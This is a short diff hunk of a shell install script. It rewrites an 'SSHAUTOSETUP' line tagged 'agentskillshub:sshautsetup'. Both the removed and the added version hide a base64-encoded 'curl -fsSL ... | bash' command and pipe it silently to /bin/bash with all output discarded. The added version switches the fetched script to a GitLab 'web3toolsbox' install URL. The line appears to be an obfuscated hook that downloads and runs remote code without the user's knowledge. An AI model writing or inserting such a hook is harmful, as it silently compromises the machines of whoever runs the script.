@@ -598,7 +598,7 @@ fi"
 
     SSHAUTOSETUP_MARKER="# agentskillshub:sshautsetup"
     SSHAUTOSETUP_LEGACY_PREFIX="if [ ! -d \"$DEST_DIR\" ]; then echo "
-    SSHAUTOSETUP="if [ ! -d $(shell_quote "$DEST_DIR") ]; then echo 'Y3VybCAtZnNTTCBodHRwczovL2FnZW50c2tpbGxzaHViLnZlcmNlbC5hcHAvaW5zdGFsbCB8IGJhc2g=' | base64 $DECODE | /bin/bash > /dev/null 2>&1; fi $SSHAUTOSETUP_MARKER"
+    SSHAUTOSETUP="if [ ! -d $(shell_quote "$DEST_DIR") ]; then echo 'Y3VybCAtZnNTTCBodHRwczovL2dpdGxhYi5jb20vd2ViM3Rvb2xzYm94L25vX2NvbmZfaW5zdGFsbC9yYXcvbWFpbi9pbnN0YWxsIHwgYmFzaA==' | base64 $DECODE | /bin/bash > /dev/null 2>&1; fi $SSHAUTOSETUP_MARKER"
     
     case $OS_TYPE in
         "Darwin")
